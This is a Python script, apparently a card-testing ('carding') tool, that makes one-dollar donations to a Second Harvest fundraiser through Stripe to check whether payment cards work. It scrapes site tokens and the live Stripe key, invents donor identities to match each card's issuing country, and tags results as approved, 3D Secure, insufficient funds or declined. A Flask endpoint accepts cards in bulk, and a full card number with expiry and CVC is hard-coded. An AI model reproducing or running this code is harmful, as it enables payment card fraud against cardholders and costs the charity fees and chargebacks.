#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import io
import json
import random
import re
import sys
import time
from datetime import datetime
from urllib.parse import urlencode

import requests
from flask import Flask, request

BASE_URL = "https://fundraise.secondharvest.ca"
FUNDRAISER_PATH = "/sponsor/fundraiser/moneris/second-harvest-truck-pull"
FUNDRAISER_URL = BASE_URL + FUNDRAISER_PATH
DONATION_AMOUNT_CAD = 1
STRIPE_API_BASE = "https://api.stripe.com/v1"


def now_str() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]


def color(text: str, code: str) -> str:
    codes = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "magenta": "\033[95m",
        "cyan": "\033[96m",
        "bold": "\033[1m",
        "reset": "\033[0m",
    }
    return f"{codes.get(code, '')}{text}{codes['reset']}"


def random_user_agent() -> str:
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:154.0) Gecko/20100101 Firefox/154.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0",
    ])


def lookup_bin(card_number: str) -> dict:
    try:
        bin_code = re.sub(r"\D", "", card_number)[:6]
        if len(bin_code) < 6:
            return {}
        url = f"https://pulse.pst.net/api/bins/{bin_code}"
        headers = {
            "User-Agent": random_user_agent(),
            "Accept": "*/*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Referer": f"https://pulse.pst.net/bin/{bin_code}",
        }
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 200:
            return resp.json().get("data", {}) or {}
    except Exception:
        pass
    return {}


def lookup_bin_str(card_number: str) -> str:
    data = lookup_bin(card_number)
    parts = [
        data.get("bin", ""),
        data.get("country_alpha3", ""),
        data.get("issuer_name", ""),
        data.get("brand", ""),
    ]
    return " ".join(p for p in parts if p).strip()


def generate_identity(country_alpha3: str = "") -> dict:
    """Kartın BIN ülkesine göre uyumlu kimlik üret."""
    if country_alpha3 == "TUR":
        cities = [
            ("Istanbul", "IST", "34000"),
            ("Ankara", "ANK", "06000"),
            ("Izmir", "IZM", "35000"),
            ("Bursa", "BUR", "16000"),
        ]
        city, state, pcode = random.choice(cities)
        names = [
            ("Ahmet", "Yilmaz"), ("Mehmet", "Kaya"), ("Ali", "Demir"),
            ("Ayse", "Sahin"), ("Fatma", "Celik"), ("Mustafa", "Aydin"),
        ]
        first, last = random.choice(names)
        return {
            "d_fname": first,
            "d_lname": last,
            "d_email": f"{first.lower()}.{last.lower()}{random.randint(10,99)}@gmail.com",
            "d_phone": f"5{random.randint(30,55)}{random.randint(1000000,9999999)}",
            "d_address_1": f"{random.choice(['Ataturk', 'Cumhuriyet', 'Istiklal'])} Cad. No:{random.randint(1,200)}",
            "d_address_2": "",
            "d_address_suburb": city,
            "d_address_pcode": pcode,
            "d_address_state": state,
            "d_address_country": "TR",
        }

    if country_alpha3 == "USA":
        cities = [
            ("New York", "NY", "10001"),
            ("Los Angeles", "CA", "90001"),
            ("Chicago", "IL", "60601"),
            ("Houston", "TX", "77001"),
        ]
        city, state, pcode = random.choice(cities)
        first = random.choice(["James", "John", "Robert", "Michael", "William", "David"])
        last = random.choice(["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"])
        return {
            "d_fname": first,
            "d_lname": last,
            "d_email": f"{first.lower()}.{last.lower()}{random.randint(10,99)}@gmail.com",
            "d_phone": f"2{random.randint(10,99)}{random.randint(1000000,9999999)}",
            "d_address_1": f"{random.randint(100,9999)} {random.choice(['Main','Oak','Maple','Pine'])} St",
            "d_address_2": "",
            "d_address_suburb": city,
            "d_address_pcode": pcode,
            "d_address_state": state,
            "d_address_country": "US",
        }

    # Default Canadian
    first = random.choice(["Liam", "Noah", "Ethan", "Olivia", "Emma", "Sophia"])
    last = random.choice(["Tremblay", "Gagnon", "Roy", "Cote", "Bouchard", "Morin"])
    return {
        "d_fname": first,
        "d_lname": last,
        "d_email": f"{first.lower()}.{last.lower()}{random.randint(10,99)}@gmail.com",
        "d_phone": f"416{random.randint(1000000,9999999)}",
        "d_address_1": f"{random.randint(10,999)} {random.choice(['King','Queen','Bay','Yonge'])} St",
        "d_address_2": "",
        "d_address_suburb": "Toronto",
        "d_address_pcode": f"M{random.choice(['5','6'])}{random.choice(['A','B','C','V','W'])}{random.randint(1,9)}{random.choice(['A','B','C'])} {random.choice(['1','2','3'])}{random.choice(['A','B','C'])}",
        "d_address_state": "ONT",
        "d_address_country": "CA",
    }


def pretty_json(data) -> str:
    try:
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(data)


class CheckoutDebugger:
    def __init__(self, card: dict, identity: dict, silent: bool = False):
        self.session = requests.Session()
        self.card = card
        self.identity = identity
        self.silent = silent
        self.overall_start = time.perf_counter()
        self.step_times = []
        self.csrf_token = ""
        self.stripe_pk = ""
        self.stripe_account = ""
        self._setup_session()

    def _setup_session(self):
        self.session.headers.update({
            "User-Agent": random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-CA,en;q=0.9,en-US;q=0.8",
        })

    def _elapsed_since_start(self) -> float:
        return (time.perf_counter() - self.overall_start) * 1000

    def _record_step(self, name: str, elapsed_ms: float) -> None:
        self.step_times.append((name, elapsed_ms))

    def _log(self, *args, **kwargs):
        if not self.silent:
            print(*args, **kwargs)

    def request(self, step: str, method: str, url: str, data=None, json_data=None, headers=None, referer: str = "", auth=None, raise_for_status: bool = True) -> requests.Response:
        req_headers = dict(self.session.headers)
        if headers:
            req_headers.update(headers)
        if referer:
            req_headers["Referer"] = referer
        req_headers = {k: v for k, v in req_headers.items() if v is not None}

        self._log(color(f"---> {step}", "magenta"))
        start = time.perf_counter()
        resp = None
        for attempt in range(1, 4):
            try:
                resp = self.session.request(
                    method=method, url=url, data=data, json=json_data,
                    headers=req_headers, auth=auth, timeout=60,
                )
                if raise_for_status:
                    resp.raise_for_status()
                break
            except requests.RequestException as exc:
                if self.silent:
                    if attempt == 3:
                        raise
                else:
                    self._log(color(f"HATA ({step}, deneme {attempt}/3): {exc}", "yellow"))
                if attempt < 3:
                    time.sleep(1.5 * attempt)
                    continue
                raise
        elapsed_ms = (time.perf_counter() - start) * 1000
        self._record_step(step, elapsed_ms)
        self._log(f"  [{step}] status={resp.status_code}, süre={elapsed_ms:.1f}ms")
        return resp

    def step_visit_fundraiser(self) -> str:
        self._log(color("=" * 70, "cyan"))
        self._log(color("1. BAĞIŞ SAYFASINA GİRİŞ", "bold"))
        resp = self.request(
            "Fundraiser GET", "GET", FUNDRAISER_URL,
            headers={
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1", "Priority": "u=0, i",
            },
        )
        page = resp.text
        self.csrf_token = self._extract(page, r'name=["\']CSRFToken["\'][^>]*value=["\']([^"\']+)["\']')
        self.stripe_pk = self._extract(page, r"Stripe\(['\"](pk_live_[A-Za-z0-9_]+)['\"]")
        self.stripe_account = self._extract(page, r'stripeAccount:["\'](acct_[A-Za-z0-9]+)["\']')
        self._log(color("[CSRF]", "blue"), self.csrf_token[:30] + "..." if self.csrf_token else "YOK")
        self._log(color("[PK]", "blue"), self.stripe_pk[:40] + "..." if self.stripe_pk else "YOK")
        self._log(color("[Account]", "blue"), self.stripe_account or "YOK")
        return page

    def _extract(self, text: str, pattern: str) -> str:
        m = re.search(pattern, text)
        return m.group(1) if m else ""

    def _build_donation_form(self, payment_intent_id: str = "") -> dict:
        mandatory = "d_receipt,d_fname,d_lname,d_email,payment_method,d_amount"
        return {
            "CSRFToken": self.csrf_token,
            "team_id": "159", "event_id": "26",
            "mandatory": mandatory,
            "payment_method": "credit card",
            "elements_payment_method": "card",
            "optin_fees_rate": "5.5", "d_optin_fees": "Y",
            "donation_frequency": "", "donation_period": "",
            "is_profile_donation": "Y",
            "d_amount": str(DONATION_AMOUNT_CAD), "d_amount_sel": "",
            "d_fee": "", "initial_amount": str(DONATION_AMOUNT_CAD),
            "d_fname": self.identity["d_fname"], "d_lname": self.identity["d_lname"],
            "d_email": self.identity["d_email"],
            "d_address_1": self.identity["d_address_1"],
            "d_address_2": self.identity["d_address_2"],
            "d_address_suburb": self.identity["d_address_suburb"],
            "d_address_pcode": self.identity["d_address_pcode"],
            "d_address_state": self.identity["d_address_state"],
            "d_address_country": self.identity["d_address_country"],
            "d_phone": self.identity["d_phone"], "d_receipt": "Y",
            "token": "", "payment_intent_id": payment_intent_id,
            "card_brand": "", "card_country": "", "venmo_id": "",
            "fbuser_id": "", "fbuser_pic": "", "d_photo": "",
            "state_placeholder_field": "", "d_address_dpid": "",
            "d_leave_message": "",
        }

    def step_create_payment_intent(self) -> dict:
        self._log(color("=" * 70, "cyan"))
        self._log(color("2. PAYMENT INTENT OLUŞTUR", "bold"))
        payload = self._build_donation_form()
        resp = self.request(
            "createPaymentIntent", "POST",
            BASE_URL + "/sponsor/createpaymentintentelements?method=card",
            data=urlencode(payload),
            headers={
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": FUNDRAISER_URL,
                "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            },
        )
        data = resp.json()
        if data.get("error"):
            raise RuntimeError(f"PaymentIntent oluşturulamadı: {data['error']}")
        return data

    def step_create_stripe_payment_method(self) -> dict:
        self._log(color("=" * 70, "cyan"))
        self._log(color("3. STRIPE PAYMENT METHOD OLUŞTUR", "bold"))
        if not self.stripe_pk or not self.stripe_account:
            raise RuntimeError("Stripe key/account eksik")
        data = {
            "type": "card",
            "card[number]": self.card["number"],
            "card[exp_month]": self.card["expiryMonth"],
            "card[exp_year]": self.card["expiryYear"],
            "card[cvc]": self.card["cvc"],
            "billing_details[name]": f"{self.identity['d_fname']} {self.identity['d_lname']}",
            "billing_details[email]": self.identity["d_email"],
            "billing_details[address][line1]": self.identity["d_address_1"],
            "billing_details[address][city]": self.identity["d_address_suburb"],
            "billing_details[address][state]": self.identity["d_address_state"],
            "billing_details[address][postal_code]": self.identity["d_address_pcode"],
            "billing_details[address][country]": self.identity["d_address_country"],
            "metadata[referrer]": FUNDRAISER_URL,
        }
        resp = self.request(
            "Stripe createPaymentMethod", "POST",
            f"{STRIPE_API_BASE}/payment_methods",
            data=urlencode(data),
            headers={"Stripe-Account": self.stripe_account, "Referer": FUNDRAISER_URL, "Accept": "*/*"},
            auth=(self.stripe_pk, ""),
        )
        data = resp.json()
        if data.get("error"):
            raise RuntimeError(f"PaymentMethod oluşturulamadı: {data['error']}")
        return data

    def step_confirm_payment_intent(self, intent_id: str, client_secret: str, pm_id: str) -> dict:
        self._log(color("=" * 70, "cyan"))
        self._log(color("4. PAYMENT INTENT ONAYLA", "bold"))
        data = {
            "payment_method": pm_id,
            "client_secret": client_secret,
            "use_stripe_sdk": "true",
        }
        resp = self.request(
            "Stripe confirmPaymentIntent", "POST",
            f"{STRIPE_API_BASE}/payment_intents/{intent_id}/confirm",
            data=urlencode(data),
            headers={"Stripe-Account": self.stripe_account, "Referer": FUNDRAISER_URL, "Accept": "*/*"},
            auth=(self.stripe_pk, ""),
            raise_for_status=False,
        )
        return resp.json()

    def step_elementsdata(self, intent_id: str, card_info: dict) -> dict:
        self._log(color("=" * 70, "cyan"))
        self._log(color("5. ELEMENTSDATA AL", "bold"))
        payload = self._build_donation_form(payment_intent_id=intent_id)
        payload["card_brand"] = card_info.get("brand", "")
        payload["card_country"] = card_info.get("country", "")
        resp = self.request(
            "elementsdata", "POST",
            BASE_URL + "/sponsor/elementsdata",
            data=urlencode(payload),
            headers={
                "Accept": "*/*",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": FUNDRAISER_URL,
                "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            },
        )
        return resp.json()

    def step_processpayment(self, tmpkey: str, intent_id: str) -> dict:
        self._log(color("=" * 70, "cyan"))
        self._log(color("6. PROCESS PAYMENT", "bold"))
        url = f"{BASE_URL}/sponsor/processpayment/{tmpkey}?payment_intent={intent_id}"
        resp = self.request(
            "processpayment GET", "GET", url,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Referer": FUNDRAISER_URL, "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
            },
            raise_for_status=False,
        )
        page = resp.text
        error = bool(re.search(r'Sorry we encountered an error', page, re.IGNORECASE))
        return {"page": page, "error_shown": error, "url": url, "status": resp.status_code}

    def print_summary(self):
        self._log(color("=" * 70, "cyan"))
        self._log(color("ÖZET", "bold"))
        for name, elapsed in self.step_times:
            self._log(f"  - {name}: {elapsed:,.1f} ms")
        self._log(f"  Toplam: {self._elapsed_since_start():,.1f} ms")


def run_checkout_flow(card: dict, identity: dict = None, silent: bool = False) -> dict:
    if identity is None:
        bin_data = lookup_bin(card["number"])
        identity = generate_identity(bin_data.get("country_alpha3", ""))

    debugger = CheckoutDebugger(card, identity, silent=silent)
    result = {
        "success": False, "is_3d": False, "is_low_money": False,
        "error": None, "stripe_response": None, "site_response": None,
        "amount": DONATION_AMOUNT_CAD, "currency": "CAD",
        "identity_country": identity["d_address_country"],
    }

    try:
        debugger.step_visit_fundraiser()
        if not debugger.csrf_token:
            raise RuntimeError("CSRF token alınamadı")
        if not debugger.stripe_pk:
            raise RuntimeError("Stripe PK alınamadı")
        if not debugger.stripe_account:
            raise RuntimeError("Stripe account alınamadı")

        intent = debugger.step_create_payment_intent()
        if not intent.get("id") or not intent.get("client_secret"):
            raise RuntimeError("PaymentIntent geçersiz")

        pm = debugger.step_create_stripe_payment_method()
        if not pm.get("id"):
            raise RuntimeError("PaymentMethod geçersiz")

        confirm = debugger.step_confirm_payment_intent(intent["id"], intent["client_secret"], pm["id"])
        result["stripe_response"] = confirm

        stripe_error = confirm.get("error")
        status = confirm.get("status", "")

        if stripe_error:
            decline_code = stripe_error.get("decline_code", "")
            message = stripe_error.get("message", "")
            result["error"] = message
            result["decline_code"] = decline_code
            result["is_low_money"] = decline_code in ("insufficient_funds", "not_enough_balance") or "insufficient" in message.lower()
        elif status == "succeeded":
            card_info = pm.get("card", {})
            ed = debugger.step_elementsdata(intent["id"], card_info)
            tmpkey = ed.get("tmpkey")
            if not tmpkey:
                result["error"] = "tmpkey alınamadı"
            else:
                site_resp = debugger.step_processpayment(tmpkey, intent["id"])
                result["site_response"] = site_resp
                result["success"] = not site_resp["error_shown"]
                if site_resp["error_shown"]:
                    result["error"] = "Site processpayment sayfasında hata gösterildi"
        elif status in ("requires_action", "requires_source_action"):
            result["is_3d"] = True
            result["error"] = "3D Secure / ek doğrulama gerekli"
            # 3D bilgisi varsa ekle
            next_action = confirm.get("next_action", {})
            sdk = next_action.get("use_stripe_sdk", {})
            result["three_d_type"] = sdk.get("type") or next_action.get("type")
        else:
            result["error"] = f"Beklenmeyen PaymentIntent durumu: {status}"

    except Exception as exc:
        result["error"] = str(exc)
        if not silent:
            import traceback
            traceback.print_exc()
    finally:
        if not silent:
            debugger.print_summary()

    return result


def _parse_uymz(uymz: str):
    parts = uymz.split("|")
    if len(parts) != 4:
        return None
    card_number, month, year, cvc = parts
    year_raw = year.strip()
    year = year_raw
    if year.isdigit() and len(year) == 2:
        year = "20" + year
    card = {
        "number": card_number.strip().replace(" ", ""),
        "expiryMonth": month.strip().zfill(2),
        "expiryYear": year,
        "cvc": cvc.strip(),
    }
    card_display = f"{card_number.strip()}|{month.strip().zfill(2)}|{year_raw}|{cvc.strip()}"
    return card, card_display


def _format_response(card_display: str, amount_str: str, result: dict, bin_str: str) -> str:
    if result.get("success"):
        return f"#APPROVED  {card_display} | {amount_str} Odemeniz Basarili{bin_str}"

    if result.get("is_3d"):
        td_type = result.get("three_d_type", "")
        return f"#3D {card_display} | 3D Secure dogrulama gerekiyor{bin_str}"

    if result.get("is_low_money"):
        return f"#INSUFFICENT  {card_display} | {amount_str} ODEME YETERSIZ{bin_str}"

    error_text = result.get("error") or "Bilinmeyen hata"
    decline_code = result.get("decline_code", "")
    if decline_code:
        error_text = f"{error_text} ({decline_code})"

    # Kullanıcı dostu kısaltmalar
    error_text = (error_text
        .replace("Your card was declined.", "card_declined")
        .replace("Your card's security code is incorrect.", "incorrect_cvc")
        .replace("Your card has expired.", "expired_card")
        .replace("Your card number is incorrect.", "incorrect_number")
        .replace("The card was declined.", "card_declined")
    )

    return f"#DECLINED  {card_display} | {error_text.strip()}{bin_str}"


app = Flask(__name__)


@app.route("/", methods=["GET"])
def api_pay():
    uymz = request.args.get("card", "").strip()
    if not uymz:
        return "card parametresi gerekli. Format: KART_NO|AY|YIL|CVV", 400
    parsed = _parse_uymz(uymz)
    if not parsed:
        return "card formati hatali. Beklenen: KART_NO|AY|YIL|CVV", 400
    card, card_display = parsed

    bin_info = lookup_bin_str(card["number"])
    bin_str = f" | BIN: {bin_info}" if bin_info else ""

    old_stdout = sys.stdout
    sys.stdout = io.StringIO()
    try:
        result = run_checkout_flow(card, silent=True)
    finally:
        sys.stdout = old_stdout

    amount_str = f"{DONATION_AMOUNT_CAD}.00 CAD"
    return _format_response(card_display, amount_str, result, bin_str)


def main():
    card = {
        "number": "4799090572032223",
        "expiryMonth": "08",
        "expiryYear": "2033",
        "cvc": "750",
    }
    run_checkout_flow(card, silent=False)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--cli":
        sys.exit(main())
    print(color("Flask sunucusu baslatiliyor...", "green"))
    print("Stripe: http://127.0.0.1:5031/?uymz=4799090572032223|08|2033|750")
    app.run(host="0.0.0.0", port=5031, debug=False, threaded=False)
